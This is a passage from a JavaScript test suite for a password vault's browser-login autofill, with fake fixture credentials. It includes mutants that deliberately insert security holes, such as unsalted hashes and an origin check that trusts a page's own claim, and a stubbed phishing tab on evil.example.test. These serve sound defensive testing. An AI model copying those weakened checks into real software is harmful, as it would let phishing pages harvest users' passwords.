            resolveAnswered: (ids, by) => { for (const id of ids || []) { const r = todosMap.get(id); if (r) { r.status = 'done'; r.by = by; } } },
          };
          const logTip = Lm.create({ vault: engTip, grants: () => gTip, totpCode: (n, o) => totpTip.codeForLogin(n, o), log: () => {} });
          const doorTip = VPD.create({ vault: engTip, userTodos: userTodosStub, logins: logTip, log: () => {} });
          const vcTip = VC.create({ vault: engTip, sources: { secrets: () => VC.secretSource({ vault: engTip }) } });

          // Law 0: `recordOf(recordOf(x))` equals `recordOf(x)` on EVERY `.356`–`.390` record in the vault!
          const legacyNames = ['alice', 'tuser', 'prevuser', 'aguser', 'rbuser', 'reg1', 'reg2', 'regcard', 'carl']
            .map((u) => `web-login:https://shop.example.test#${u}`);
          const idempotentAll = legacyNames.every((nm) => {
            const g = engTip.secretGet(nm);
            const raw = g.value.toString('utf8');
            const r1 = BL.recordOf(raw);
            const r2 = BL.recordOf(r1);
            return Boolean(r1 && r2 && JSON.stringify(r1) === JSON.stringify(r2));
          });

          // Door 1: `list()` carries `hasCurrent`, `hasPrevious`, `pending`, `totpName` on all legacy rows (`0` writes)
          const listed = logTip.list();
          const rowOf = (u) => (listed.entries || []).find((e) => e.user === u);
          const listFactsOk = listed.ok
            && rowOf('alice')?.hasCurrent === true && rowOf('alice')?.pending === null
            && rowOf('tuser')?.hasCurrent === true && rowOf('tuser')?.totpName === 'shop2fa'
            && rowOf('prevuser')?.hasCurrent === true && rowOf('prevuser')?.hasPrevious === true
            && rowOf('aguser')?.hasCurrent === true
            && rowOf('rbuser')?.hasCurrent === true && rowOf('rbuser')?.hasPrevious === true
            && rowOf('reg1')?.hasCurrent === false && rowOf('reg1')?.pending === 'register'
            && rowOf('carl')?.hasCurrent === true && rowOf('carl')?.hasPrevious === true && rowOf('carl')?.pending === null;

          // Door 2: `.390` `pending: 'change'` (`carl`) fills the NEW password (`CarlNew390Pw!2`) on `/password` and OLD (`CarlOld390Pw!1`) on `/previous` with `0` writes
          logTip.grant('web-login:https://shop.example.test#carl', 'this-account', 'session:conv-carl');
          const fillCarlCur = logTip.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#carl/password', facts: { conversationKeys: ['conv-carl'] }, conv: 'conv-carl' });
          const fillCarlPrev = logTip.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#carl/previous', facts: { conversationKeys: ['conv-carl'] }, conv: 'conv-carl' });
          const zeroWritesAfterReads = tipSecretPuts === 0;

          // Door 3: Vault window `addOwn` updates `.390` `alice` AND rollback-rewritten `rbuser`
          const updAlice = logTip.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'AliceTipUpdated!2' }, { who: 'owner' });
          const updRb = logTip.addOwn({ origin: 'https://shop.example.test', username: 'rbuser', password: 'RbTipUpdated!3' }, { who: 'owner' });

          // Door 4: `.390` login request card (`vault-paste-door`) updates existing `.390` `tuser` and writes grant
          const askCard = doorTip.request({
            caller: { conversationId: 'conv-card', scope: 'conv-card', sessionKey: 'sk-card', name: 'Card Agent' },
            words: 'Shop account',
            purpose: 'sign in to shop',
            kind: 'login',
            hosts: ['https://shop.example.test'],
          });
          const ansCard = doorTip.answer(askCard.requestId, {
            answer: 'store',
            person: true,
            login: { username: 'tuser', password: 'TuserUpd!2', totpName: 'shop2fa', allow: true, expect: 'update' },   // B-ab6c: the card's update is the person's second press (the first says login_would_update)
          });

          // Door 5: Takeover "Save login" card (`offerOwnerSaveCard` + `answerCard`) updates `.390` `prevuser`
          const tkOffer = logTip.offerOwnerSaveCard({ origin: 'https://shop.example.test', username: 'prevuser', password: 'PrevTkUpd!3' });
          const tkAns = logTip.answerCard(tkOffer.id, { approve: true, shown: tkOffer.shown, who: 'owner' });

          // Door 6: `--generate` password change on `.390` `aguser`
          const genChg = logTip.resolveFill({
            tabOrigin: 'https://shop.example.test',
            spec: 'shop.example.test#aguser/password',
            generate: true,
            facts: { conversationKeys: ['conv-ag'] },
            conv: 'conv-ag',
            owners: ['conv-ag'],
          });

          // Door 7: Owner `confirmOwn`, `discardPending`, AND For-you `answerCard` on `.390` `pending: 'register'` entries
          const cfmReg1 = logTip.confirmOwn('web-login:https://shop.example.test#reg1', { who: 'owner' });
          const dscReg2 = logTip.discardPending('web-login:https://shop.example.test#reg2', { who: 'owner' });
          const regCardId = 'sl-' + crypto.createHash('sha256').update('pending\u0000web-login:https://shop.example.test#regcard\u00001').digest('hex').slice(0, 8);
          const regCardView = logTip.cardOf(regCardId);
          const ansRegCard = regCardView ? logTip.answerCard(regCardId, { approve: true, shown: regCardView.shown, who: 'owner' }) : { ok: false };

          // Door 8: Vault window Reveal (`vault-contents`), `Use for…` (`grant`/`ungrant`), and Delete (`drop`)
          const revWin = await vcTip.startReveal('owner', vpwC1);
          const revCarl = vcTip.reveal('owner', revWin.page, 'secrets:web-login:https://shop.example.test#carl#password');
          const revAlice = vcTip.reveal('owner', revWin.page, 'secrets:web-login:https://shop.example.test#alice#password');
          const grantAlice = logTip.grant('web-login:https://shop.example.test#alice', 'this-account', 'session:conv-alice');
          const ungrantAlice = logTip.ungrant(grantAlice.resource, 'conversation:conv-alice');
          const dropCarl = logTip.drop('web-login:https://shop.example.test#carl', { who: 'owner' });
          const carlGoneAfterDrop = !(logTip.list().entries || []).some((e) => e.user === 'carl');

          ok(idempotentAll
            && listFactsOk
            && fillCarlCur.ok && fillCarlCur.value === 'CarlNew390Pw!2'
            && fillCarlPrev.ok && fillCarlPrev.value === 'CarlOld390Pw!1'
            && zeroWritesAfterReads
            && updAlice.ok && updAlice.updated === true
            && updRb.ok && updRb.updated === true
            && askCard.ok && ansCard.ok && ansCard.updated === true && ansCard.allowed === true
            && tkOffer.ok && tkOffer.update === true && tkAns.ok && tkAns.saved === true && tkAns.updated === true
            && genChg.ok && genChg.generated === true && genChg.pending === 'change'
            && cfmReg1.ok && cfmReg1.confirmed === true && cfmReg1.kind === 'register'
            && dscReg2.ok && dscReg2.discarded === true && dscReg2.dropped === true
            && Boolean(regCardView) && ansRegCard.ok && ansRegCard.confirmed === true
            && revCarl.ok && revCarl.value === 'CarlNew390Pw!2'
            && revAlice.ok && revAlice.value === 'AliceTipUpdated!2'
            && grantAlice.ok && ungrantAlice.ok
            && dropCarl.ok && carlGoneAfterDrop,
            `r26 Compulsory 1 [${oracle390Label}]: recordOf is strictly idempotent and EVERY owner door (list facts, .390 pending:change fill, window update, .390 login card update+grant, takeover save card, --generate change, confirm, discard, pending card, reveal, grant/ungrant, delete) works on .356-.390 and rollback-rewritten entries`,
            { idempotentAll, listFactsOk, fillCarlCur: fillCarlCur.value, fillCarlPrev: fillCarlPrev.value, zeroWritesAfterReads, updAlice, updRb, ansCard, tkAns, genChg: { ok: genChg.ok, pending: genChg.pending }, cfmReg1, dscReg2, ansRegCard, revCarl: revCarl.ok, revAlice: revAlice.ok, dropCarl, carlGoneAfterDrop });
        } finally {
          engTip.close();
        }

        // MUTANT 24 RED (Compulsory 1): restore r25's non-idempotent `let schema = 1;` in `recordOf` -> ALL 7 owner-door regressions reproduce RED on `.390` vault!
        const m24BlSrc = editAnchor(editAnchor(blSrc,
          '  const schema = 2;', '  let schema = 1;', "src/browser-login.js"),
          '  if (hasThreeSlotShape) {\n    if (r.schema === 1) return null;', '  if (hasThreeSlotShape) {\n    if (r.schema === 1) return null;\n    schema = 2;', "src/browser-login.js");
        if (m24BlSrc !== blSrc) {
          const blM24Path = MUT.write('src/browser-login.js', m24BlSrc, 'r26-c1-non-idempotent-recordof', { name: 'r26-c1-bl' });
          const BL_M24 = require(blM24Path);
          const m24LgSrc = editAnchor(lgSrc, "require('../browser-login.js')", `require(${JSON.stringify(blM24Path)})`, "src/server/browser-logins.js");
          const LM_M24 = MUT.load('src/server/browser-logins.js', m24LgSrc, 'r26-c1-non-idempotent-logins');
          const engM24 = VE.create({ dataDir: vaultRedDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
          await engM24.unlock(vpwC1);
          try {
            const gM24 = GS.create({ memory: true });
            const logM24 = LM_M24.create({ vault: engM24, grants: () => gM24, log: () => {} });
            const todosM24 = new Map();
            const doorM24 = VPD.create({
              vault: engM24,
              logins: logM24,
              log: () => {},
              userTodos: {
                add: (_sk, it) => { const id = 'utm-' + (todosM24.size + 1); const rec = { id, status: 'open', ...it }; todosM24.set(id, rec); return rec; },
                get: (id) => todosM24.get(id) || null,
                snapshot: () => ({ open: [...todosM24.values()] }),
                setStatus() {},
              },
            });
            const rawAlice24 = engM24.secretGet('web-login:https://shop.example.test#alice').value.toString('utf8');
            const twiceNull = BL_M24.recordOf(BL_M24.recordOf(rawAlice24)) === null;
            const mUpd = logM24.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'New' }, { who: 'owner' });
            const mAsk = doorM24.request({ caller: { conversationId: 'c24', scope: 'c24', sessionKey: 's24', name: 'A' }, words: 'w', purpose: 'p', kind: 'login', hosts: ['https://shop.example.test'] });
            const mCard = doorM24.answer(mAsk.requestId, { answer: 'store', person: true, login: { username: 'tuser', password: 'New', allow: true, expect: 'update' } });   // B-ab6c: the second press
            const mTkOffer = logM24.offerOwnerSaveCard({ origin: 'https://shop.example.test', username: 'prevuser', password: 'New' });
            const mTkAns = logM24.answerCard(mTkOffer.id, { approve: true, shown: mTkOffer.shown, who: 'owner' });
            const mGen = logM24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#aguser/password', generate: true, facts: { conversationKeys: ['conv-ag'] }, owners: ['conv-ag'] });
            const mCfm = logM24.confirmOwn('web-login:https://shop.example.test#reg1', { who: 'owner' });
            const mDsc = logM24.discardPending('web-login:https://shop.example.test#reg2', { who: 'owner' });
            const mListRow = (logM24.list().entries || []).find((e) => e.user === 'tuser');
            ok(twiceNull
              && !mUpd.ok && mUpd.code === 'bad-record'
              && !mCard.ok && mCard.code === 'bad-record'
              && !mTkAns.ok && mTkAns.code === 'bad-record'
              && !mGen.ok && mGen.code === 'login_no_entry'
              && !mCfm.ok && mCfm.code === 'login_not_pending'
              && !mDsc.ok && mDsc.code === 'login_not_pending'
              && mListRow && !('hasCurrent' in mListRow) && !('totpName' in mListRow),
              `MUTANT 24 RED (r26 Compulsory 1 non-idempotent recordOf) [${oracle390Label}]: r25 let schema=1 makes recordOf(recordOf(x))===null and fails window update, login card, takeover card, --generate, confirm, discard, and list facts on .390 entries`,
              { twiceNull, mUpd: mUpd.code, mCard: mCard.code, mTkAns: mTkAns.code, mGen: mGen.code, mCfm: mCfm.code, mDsc: mDsc.code, mListRow });
          } finally {
            engM24.close();
          }
        } else ok(false, 'MUTANT 24 RED (r26 Compulsory 1): anchor not found');

        // ── r27 COMPULSORY 1: 8-day-old `.390`-written `pending: 'register'` ×3 -> 0 writes on unlock/list/fill/restart, byte-identical vault.json, master still reads `pending = 'register'`, 1 reminder each + MUTANT 30 RED (r26 writeEntry stamp) ──
        {
          const agedBaseDir = path.join(dirC1, 'r27-aged-base');
          const agedGreenDir = path.join(dirC1, 'r27-aged-green');
          const agedRedDir = path.join(dirC1, 'r27-aged-red');
          fs.mkdirSync(agedBaseDir, { recursive: true });
          const agedVpw = 'R27#AgedVaultPass9';
          const agedNow = Date.now() - 8 * 86_400_000;
          {
            const eng390Aged = VE.create({ dataDir: agedBaseDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => agedNow });
            await eng390Aged.setup(agedVpw);
            if (BL390 && LM390) {
              const g390Aged = GS.create({ memory: true });
              const log390Aged = LM390.create({ vault: eng390Aged, grants: () => g390Aged, now: () => agedNow, log: () => {} });
              log390Aged.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: 'AliceAged390Pw!1' }, { who: 'owner' });
              log390Aged.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-aged');
              const signupForm = BL390.formOf({
                surfaceId: 's-aged',
                targetId: 't-aged',
                pageOrigin: 'https://shop.example.test',
                frameOrigin: 'https://shop.example.test',
                kind: 'signup',
                fields: [{ fieldId: 'f-u', type: 'username' }, { fieldId: 'f-p', type: 'new-password' }],
              });
              for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
                const pf = log390Aged.planFill({
                  forms: [signupForm],
                  origin: 'https://shop.example.test',
                  newUser: u,
                  generate: true,
                  facts: { conversationKeys: ['conv-aged'] },
                  conv: 'conv-aged',
                  actor: 'Aged Signup Agent',
                });
                if (!pf || !pf.ok) throw new Error(`failed to seed .390 aged signup ${u}: ${JSON.stringify(pf)}`);
              }
            } else {
              eng390Aged.secretPut('web-login:https://shop.example.test#alice', JSON.stringify({
                v: 1, origin: 'https://shop.example.test', username: 'alice', createdAt: agedNow,
                by: 'owner', source: 'owner', strength: 'unknown', password: 'AliceAged390Pw!1',
              }), { kind: 'owner' });
              for (const [idx, u] of ['agedreg1', 'agedreg2', 'agedreg3'].entries()) {
                eng390Aged.secretPut(`web-login:https://shop.example.test#${u}`, JSON.stringify({
                  v: 1, origin: 'https://shop.example.test', username: u, createdAt: agedNow,
                  by: 'agent', source: 'vault-minted', strength: 'generated',
                  password: `AgedRegPw!${idx + 1}234567890123`, pending: 'register',
                }), { kind: 'vault-minted', actor: 'Aged Signup Agent' });
              }
            }
            eng390Aged.close();
          }
          fs.cpSync(agedBaseDir, agedGreenDir, { recursive: true });
          fs.cpSync(agedBaseDir, agedRedDir, { recursive: true });

          const vaultJsonBefore = fs.readFileSync(path.join(agedGreenDir, 'vault.json'));
          const remindItems = [];
          const forYouAged = {
            add: (_pid, it) => { const id = 'rem-' + (remindItems.length + 1); remindItems.push({ id, ...it }); return id; },
            resolve: () => {},
          };
          let putsBoot1 = 0;
          let batchesBoot1 = 0;
          let fillBoot1Ok = false;
          let listBoot1PendingCount = 0;
          // Boot 1: Hub starts LOCKED -> unlock -> list() -> granted resolveFill
          {
            const eng1 = VE.create({ dataDir: agedGreenDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            const origPut1 = eng1.secretPut.bind(eng1);
            const origBatch1 = eng1.batchRecordWrite.bind(eng1);
            eng1.secretPut = (...a) => { putsBoot1++; return origPut1(...a); };
            eng1.batchRecordWrite = (...a) => { batchesBoot1++; return origBatch1(...a); };
            const g1 = GS.create({ memory: true });
            const log1 = Lm.create({ vault: eng1, grants: () => g1, forYou: forYouAged, log: () => {} });
            log1.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-aged');
            await eng1.unlock(agedVpw);
            const l1 = log1.list();
            listBoot1PendingCount = (l1.entries || []).filter((e) => e.pending === 'register').length;
            const rf1 = log1.resolveFill({
              tabOrigin: 'https://shop.example.test',
              spec: 'shop.example.test#alice/password',
              facts: { conversationKeys: ['conv-aged'] },
              conv: 'conv-aged',
            });
            fillBoot1Ok = Boolean(rf1 && rf1.ok && rf1.value === 'AliceAged390Pw!1');
            eng1.close();
          }
          const remindsAfterBoot1 = remindItems.length;

          // Boot 2 (simulated Hub restart on the SAME dataDir): starts LOCKED -> unlock -> list() -> granted resolveFill -> 0 duplicate reminders, 0 writes!
          let putsBoot2 = 0;
          let batchesBoot2 = 0;
          let fillBoot2Ok = false;
          let masterStillPendingAll3 = true;
          {
            const eng2 = VE.create({ dataDir: agedGreenDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            const origPut2 = eng2.secretPut.bind(eng2);
            const origBatch2 = eng2.batchRecordWrite.bind(eng2);
            eng2.secretPut = (...a) => { putsBoot2++; return origPut2(...a); };
            eng2.batchRecordWrite = (...a) => { batchesBoot2++; return origBatch2(...a); };
            const g2 = GS.create({ memory: true });
            const log2 = Lm.create({ vault: eng2, grants: () => g2, forYou: forYouAged, log: () => {} });
            log2.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-aged');
            await eng2.unlock(agedVpw);
            log2.list();
            const rf2 = log2.resolveFill({
              tabOrigin: 'https://shop.example.test',
              spec: 'shop.example.test#agedreg1/password',
              facts: { conversationKeys: ['conv-aged'] },
              conv: 'conv-aged',
            });
            fillBoot2Ok = Boolean(rf2 && rf2.ok && rf2.slot === 'pending');
            for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
              const rawTxt = eng2.secretGet(`web-login:https://shop.example.test#${u}`).value.toString('utf8');
              const parsedRaw = JSON.parse(rawTxt);
              const masterPending = BL390 ? BL390.recordOf(rawTxt)?.pending : parsedRaw.pending;
              if (masterPending !== 'register' || typeof parsedRaw.pending !== 'string') masterStillPendingAll3 = false;
            }
            eng2.close();
          }
          const vaultJsonAfter = fs.readFileSync(path.join(agedGreenDir, 'vault.json'));
          const vaultByteIdentical = Buffer.compare(vaultJsonBefore, vaultJsonAfter) === 0;
          const remindLedgerPath = path.join(agedGreenDir, 'browser-login-reminders.json');
          const remindLedgerRaw = fs.existsSync(remindLedgerPath)
            ? fs.readFileSync(remindLedgerPath, 'utf8')
            : '';
          const remindLedgerMode0600 = fs.existsSync(remindLedgerPath) && ((fs.statSync(remindLedgerPath).mode & 0o777) === 0o600);
          const remindLedgerZeroPlainNames = Boolean(
            remindLedgerRaw
            && !remindLedgerRaw.includes('agedreg1')
            && !remindLedgerRaw.includes('shop.example.test')
            && !remindLedgerRaw.includes('AliceAged390Pw!1')
          );
          ok(putsBoot1 === 0 && batchesBoot1 === 0 && putsBoot2 === 0 && batchesBoot2 === 0
            && vaultByteIdentical && listBoot1PendingCount === 3 && fillBoot1Ok && fillBoot2Ok
            && masterStillPendingAll3 && remindsAfterBoot1 === 3 && remindItems.length === 3
            && remindLedgerZeroPlainNames && remindLedgerMode0600,
            `r27 Compulsory 1 [${oracle390Label}]: 8-day-old .390 pending registrations ×3 incur 0 secretPut writes across unlock + list + fill + restart, keep vault.json byte-identical and .390 pending="register" intact, and file each reminder ONCE (3 total across restart, mode 0600)`,
            { putsBoot1, batchesBoot1, putsBoot2, batchesBoot2, vaultByteIdentical, listBoot1PendingCount, fillBoot1Ok, fillBoot2Ok, masterStillPendingAll3, remindsAfterBoot1, remindsAfterRestart: remindItems.length, remindLedgerMode0600 });

          // MUTANT 30 RED (r27 Compulsory 1 — r26 shape where maybeRemindPending stamps remindedAt via writeEntry):
          const m30LgSrc = editAnchor(lgSrc,
            '      if (filed) {\n        remindedDigests.add(digest);\n        dirty = true;\n        reminded++;\n      }',
            '      if (filed) {\n        const stamped = { ...o.rec, schema: 2, pending: { ...o.rec.pending, remindedAt: t } };\n        writeEntry(e.name, stamped, { actor: e.actor, owner: e.owner });\n        reminded++;\n      }'
          , "src/server/browser-logins.js");
          if (m30LgSrc !== lgSrc) {
            const LM_M30 = MUT.load('src/server/browser-logins.js', m30LgSrc, 'r27-c1-remind-rewrites-entry');
            const engM30 = VE.create({ dataDir: agedRedDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
            let putsM30 = 0;
            const origPutM30 = engM30.secretPut.bind(engM30);
            engM30.secretPut = (...a) => { putsM30++; return origPutM30(...a); };
            const gM30 = GS.create({ memory: true });
            LM_M30.create({ vault: engM30, grants: () => gM30, forYou: { add: () => 'id', resolve: () => {} }, log: () => {} });
            await engM30.unlock(agedVpw);
            let masterLostPendingAll3 = true;
            for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
              const rawTxt = engM30.secretGet(`web-login:https://shop.example.test#${u}`).value.toString('utf8');
              const parsedRaw = JSON.parse(rawTxt);
              const masterPending = BL390 ? BL390.recordOf(rawTxt)?.pending : (typeof parsedRaw.pending === 'string' ? parsedRaw.pending : undefined);
              if (masterPending !== undefined || parsedRaw.schema !== 2) masterLostPendingAll3 = false;
            }
            const redVaultAfter = fs.readFileSync(path.join(agedRedDir, 'vault.json'));
            engM30.close();
            ok(putsM30 === 3 && Buffer.compare(vaultJsonBefore, redVaultAfter) !== 0 && masterLostPendingAll3,
              `MUTANT 30 RED (r27 Compulsory 1 r26-remind-stamp) [${oracle390Label}]: r26 writeEntry inside maybeRemindPending triggers secretPut=3 on unlock and turns .390 pending registrations into confirmed logins on rollback`,
              { putsM30, masterLostPendingAll3 });
          } else ok(false, 'MUTANT 30 RED (r27 Compulsory 1): anchor not found');

          // DEK-keyed reminder marks pin (zero unsalted digests on disk) + MUTANT 33 RED:
          // Same pending entry `(name, rev, kind, createdAt)` under two independent DEKs MUST produce completely disjoint
          // 32-hex marks, and zero marks may equal any unsalted sha256 prefix of name/origin/user/pendingRemindKey.
          const runTwoDekMarksProbe = async (LoginsMod, tag) => {
            const outMarks = [];
            const outModes = [];
            const sameEntryName = 'web-login:https://shop.example.test#agedreg1';
            const sameRec = BL.newRecord({
              origin: 'https://shop.example.test',
              username: 'agedreg1',
              password: 'DekPinPendingPw!1234567890',
              source: 'vault-minted',
              pending: 'register',
              now: agedNow,
              conversation: 'conv-dek',
            });
            const rkExpected = BL.pendingRemindKey(sameEntryName, sameRec);
            for (const sub of ['dek-a', 'dek-b']) {
              const d = path.join(dirC1, `${tag}-${sub}`);
              fs.mkdirSync(d, { recursive: true });
              const ev = VE.create({ dataDir: d, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => agedNow });
              await ev.setup(`DekPass#${sub}!9`);
              ev.secretPut(sameEntryName, BL.textOf(sameRec), { kind: 'vault-minted', rev: 1, pending: 'register' });
              ev.close();
              const evOpen = VE.create({ dataDir: d, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
              const gm = GS.create({ memory: true });
              LoginsMod.create({ dataDir: d, vault: evOpen, grants: () => gm, forYou: { add: () => 'id', resolve: () => {} }, log: () => {} });
              await evOpen.unlock(`DekPass#${sub}!9`);
              evOpen.close();
              const f = path.join(d, 'browser-login-reminders.json');
              const parsed = JSON.parse(fs.readFileSync(f, 'utf8'));
              outModes.push(fs.statSync(f).mode & 0o777);
              outMarks.push(Array.isArray(parsed.reminded) ? parsed.reminded : []);
            }
            const unsaltedCandidates = [
              rkExpected,
              sameEntryName,
              'https://shop.example.test',
              'shop.example.test',
              'agedreg1',
              `${sameEntryName}\u00001`,
              `${sameEntryName}\u0000register`,
              `${sameEntryName}\u00001\u0000register`,
            ].map((s) => crypto.createHash('sha256').update(String(s)).digest('hex').slice(0, 32));
            return { marksA: outMarks[0], marksB: outMarks[1], modes: outModes, unsaltedCandidates, shaRk32: unsaltedCandidates[0] };
          };
          const dekPin = await runTwoDekMarksProbe(Lm, 'real-dek');
          const agedParsedMarks = remindLedgerRaw ? (JSON.parse(remindLedgerRaw).reminded || []) : [];
          const agedUnsaltedSet = new Set();
          for (const u of ['agedreg1', 'agedreg2', 'agedreg3']) {
            const nm = `web-login:https://shop.example.test#${u}`;
            for (const cand of [nm, u, 'https://shop.example.test', `${nm}\u00001\u0000register\u0000${agedNow}`]) {
              agedUnsaltedSet.add(crypto.createHash('sha256').update(cand).digest('hex').slice(0, 32));
            }
          }
          ok(dekPin.marksA.length === 1 && dekPin.marksB.length === 1
            && /^[0-9a-f]{32}$/.test(dekPin.marksA[0]) && /^[0-9a-f]{32}$/.test(dekPin.marksB[0])
            && dekPin.modes[0] === 0o600 && dekPin.modes[1] === 0o600
            && dekPin.marksA[0] !== dekPin.marksB[0]
            && !dekPin.unsaltedCandidates.includes(dekPin.marksA[0])
            && !dekPin.unsaltedCandidates.includes(dekPin.marksB[0])
            && agedParsedMarks.length === 3 && agedParsedMarks.every((m) => !agedUnsaltedSet.has(m)),
            'r27 DEK-keyed reminder marks (RULE 5′): swapping the vault DEK produces completely distinct 32-hex marks in browser-login-reminders.json (mode 0600 via writeJsonAtomic), and zero marks match any unsalted sha256 prefix',
            dekPin);

          const m33LgSrc = editAnchor(lgSrc,
            "      const mac = vault.macOf('browser-login-remind', rk);",
            "      const mac = crypto.createHash('sha256').update(rk).digest('hex');"
          , "src/server/browser-logins.js");
          if (m33LgSrc !== lgSrc) {
            const LM_M33 = MUT.load('src/server/browser-logins.js', m33LgSrc, 'r27-remind-unsalted-sha256');
            const dekMut = await runTwoDekMarksProbe(LM_M33, 'mut33-dek');
            ok(dekMut.marksA.length === 1 && dekMut.marksA[0] === dekMut.marksB[0] && dekMut.marksA[0] === dekMut.shaRk32,
              'MUTANT 33 RED (r27 unsalted-remind-sha256): replacing vault.macOf with unsalted sha256(rk) yields identical 32-hex marks across different DEKs and matches sha256(rk).slice(0, 32)',
              dekMut);
          } else ok(false, 'MUTANT 33 RED (r27 unsalted-remind-sha256): anchor not found');
        }
      }

      // ── r26 COMPULSORY 2 (Fast Legs): Dangerous-direction Browser-vs-DOM mismatch + MUTANT 25 RED + in-flight cross-origin nav hold/guard + MUTANT 26 RED ──
      {
        const { WebSocketServer } = require(path.join(REPO, 'node_modules/ws'));

        // Leg A: Dangerous direction — browser truth (`Target.getTargetInfo` / `Page.getFrameTree` / `trackedUrl`) is on
        // `https://evil.example.test/phish`, while isolated-world DOM `location.origin` claims `https://shop.example.test`!
        let evilInsertCount = 0;
        const revWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => revWss.once('listening', r));
        revWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Browser.getVersion') sock.send(JSON.stringify({ id: m.id, result: { product: 'Chrome/154', userAgent: 'HeadlessChrome/154' } }));
            else if (m.method === 'Target.getTargets') sock.send(JSON.stringify({ id: m.id, result: { targetInfos: [{ targetId: 'T-REV', type: 'page', url: 'https://evil.example.test/phish', title: 'Evil' }] } }));
            else if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-rev' } }));
            else if (m.method === 'Target.getTargetInfo') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { targetInfo: { targetId: 'T-REV', type: 'page', url: 'https://evil.example.test/phish' } } }));
            else if (m.method === 'Page.getFrameTree') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { frameTree: { frame: { id: 'T-REV', url: 'https://evil.example.test/phish', securityOrigin: 'https://evil.example.test' } } } }));
            else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 11 } }));
            else if (m.method === 'Runtime.evaluate') {
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } }));
            } else if (m.method === 'Input.insertText') {
              evilInsertCount++;
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
            } else {
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
            }
          });
        });
        try {
          const kRev = { ...skR24, cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${revWss.address().port}` }) };
          const wRev = Dm.create({ keeper: kRev, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
          await wRev.arm('bp-rev');
          wRev.noteActiveTab({ profileId: 'bp-rev', browserKey: 'bk-mr24' }, 'T-REV');
          const rRevFill = await wRev.fillVaultField({ profileId: 'bp-rev', browserKey: 'bk-mr24' }, {
            targetId: 'T-REV', target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
          });
          wRev.shutdown();

          const stubDangerCall = async (method) => {
            if (method === 'Page.getFrameTree') return { result: { frameTree: { frame: { id: 'F-EVIL', url: 'https://evil.example.test/phish', securityOrigin: 'https://evil.example.test' } } } };
            if (method === 'Target.getTargetInfo') return { result: { targetInfo: { targetId: 'T-REV', url: 'https://evil.example.test/phish' } } };
            if (method === 'Page.createIsolatedWorld') return { result: { executionContextId: 11 } };
            if (method === 'Runtime.evaluate') return { result: { result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } } };
            return { result: {} };
          };
          const realIsoDanger = await LF.openIsolatedOrigin({
            call: stubDangerCall,
            browserCall: stubDangerCall,
            targetId: 'T-REV',
            trackedUrl: () => 'https://evil.example.test/phish',
          });

          ok(!rRevFill.ok && rRevFill.code === 'login_phishing' && evilInsertCount === 0
            && !realIsoDanger.ok && realIsoDanger.code === 'origin_mismatch' && realIsoDanger.browserOrigin === 'https://evil.example.test' && realIsoDanger.isoOrigin === 'https://shop.example.test',
            'r26 Compulsory 2 (dangerous direction): browser on https://evil.example.test while isolated-world DOM claims https://shop.example.test is refused login_phishing with 0 Input.insertText calls',
            { rRevFill, evilInsertCount, realIsoDanger });

          // MUTANT 25 RED (Compulsory 2 verifier mutant): overwrite `frameOrigin = secOrigin = targetOrigin = isoOrigin; trackedOrigin = null;` before `const allAgree` in `openIsolatedOrigin`!
          const m25LfSrc = editAnchor(lfSrc,
            '    const allAgree = !!(frameOrigin && secOrigin && targetOrigin && isoOrigin',
            '    frameOrigin = secOrigin = targetOrigin = isoOrigin; trackedOrigin = null;\n    const allAgree = !!(frameOrigin && secOrigin && targetOrigin && isoOrigin'
          , "src/server/browser-login-fill.js");
          const LF_M25 = m25LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m25LfSrc, 'r26-c2-trusts-iso-origin') : null;
          if (LF_M25) {
            const mutIsoDanger = await LF_M25.openIsolatedOrigin({
              call: stubDangerCall,
              browserCall: stubDangerCall,
              targetId: 'T-REV',
              trackedUrl: () => 'https://evil.example.test/phish',
            });
            ok(mutIsoDanger.ok === true && mutIsoDanger.origin === 'https://shop.example.test',
              'MUTANT 25 RED (r26 Compulsory 2 trusts-iso-origin): verifier mutant replacing browser/frame/security origins with isoOrigin accepts https://shop.example.test on https://evil.example.test tab',
              mutIsoDanger);
          } else ok(false, 'MUTANT 25 RED (r26 Compulsory 2): anchor not found');
        } finally {
          await new Promise((r) => revWss.close(r));
        }

